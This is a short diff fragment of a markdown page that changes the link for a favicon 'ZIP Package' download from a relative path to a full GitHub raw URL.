@@ -70,7 +70,7 @@
 #
 ## Downloads
 
-<a href="3f446392a21bf3d2a08024894cccdb3e.ico.zip">
+<a href="https://github.com/7pub/cdn-gw/raw/master/favicon/Crown/3f446392a21bf3d2a08024894cccdb3e.ico.zip">
     <p align="center" style="font-size:2.5em">ZIP Package</p>
 </a>
 
